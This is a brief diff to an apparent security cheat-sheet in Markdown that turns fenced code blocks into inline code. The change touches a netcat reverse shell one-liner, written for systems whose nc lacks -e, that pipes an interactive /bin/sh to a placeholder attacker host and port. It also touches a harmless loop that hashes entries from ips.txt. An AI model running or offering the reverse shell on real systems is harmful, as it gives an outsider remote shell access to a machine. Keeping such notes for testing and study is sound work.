@@ -28,11 +28,7 @@ Pipe output from things like `strings` here to finds hashes. The above will work
 
 or if no `-e`
 
-```sh
-mkfifo /tmp/f
-cat /tmp/f | /bin/sh -i 2>&1 | nc attacker ip listening port > /tmp/f
-```
+`mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker ip listening port > /tmp/f`
+
 ### do things to entires in IPs.txt
-```bash
-for ip in `cat ips.txt`; do md5sum $ip; done >> something.txt
-```
+`for ip in `cat ips.txt`; do md5sum $ip; done >> something.txt`
